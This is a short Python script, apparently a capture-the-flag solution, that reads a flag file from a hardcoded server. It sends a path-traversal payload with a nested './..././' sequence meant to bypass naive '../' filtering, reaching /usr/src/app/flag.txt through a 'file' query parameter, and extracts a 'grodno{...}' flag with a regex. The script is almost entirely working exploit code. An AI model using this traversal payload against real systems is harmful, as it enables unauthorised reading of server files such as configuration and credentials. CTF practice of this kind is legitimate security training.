import requests
import re

def main(url):

	flag_re = 'grodno{.*?}'
	req = requests.get(url)
	# print (req.text)
	flag = re.findall(flag_re, req.text)
	print(flag[0])

if __name__=='__main__':
	url='http://45.88.77.177:21002/files?file=./..././..././..././..././..././..././..././..././usr/src/app/flag.txt'
	main(url)
